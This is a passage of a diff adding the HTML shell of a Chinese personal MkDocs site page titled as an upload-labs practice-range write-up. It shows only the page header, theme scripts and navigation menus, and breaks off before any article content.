@@ -1,0 +1,5225 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Aniston的个人网站">
+      
+      
+        <meta name="author" content="Aniston">
+      
+      
+        <link rel="canonical" href="https://AnistonH.github.io/WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+      
+      
+        <link rel="prev" href="../Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+      
+      
+        <link rel="next" href="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.36">
+    
+    
+      
+        <title>Upload labs靶场打靶记录 - Aniston的个人网站</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.06209087.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/no-footer.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/unordered-list-symbols.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#upload-labs" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Aniston的个人网站" class="md-header__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Aniston的个人网站
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Upload labs靶场打靶记录
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至夜间模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换至夜间模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至日间模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换至日间模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ME/" class="md-tabs__link">
+          
+  
+    
+  
+  我
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../DEC/" class="md-tabs__link">
+          
+  
+    
+  
+  开发
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+    
+  
+  网络安全
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ESSAY/" class="md-tabs__link">
+          
+  
+    
+  
+  随笔
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../TimeLine/" class="md-tabs__link">
+          
+  
+    
+  
+  时间线
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../WEBSITE/" class="md-tabs__link">
+          
+  
+    
+  
+  网站
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Aniston的个人网站" class="md-nav__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Aniston的个人网站
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ME/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    我
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            我
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人介绍
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/profile/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人信息
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/contact/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人联系方式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/account/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人公众账号
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/experience/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人经历
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/support/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    打赏支持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../DEC/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    开发
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            开发
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    数据结构
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            数据结构
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 串、数组、广义表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数和二叉树
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E5%9B%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 图
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 排序
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 查找
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    代码
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            代码
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    复杂度例题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    顺序表SeqList
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Triplets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    三元组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表-实验报告二
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    双向链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Grade%20Management%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    成绩管理系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    循环队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE%E8%BF%90%E7%AE%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    稀疏矩阵的转置
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/" class="md-nav__link">
+        
+  
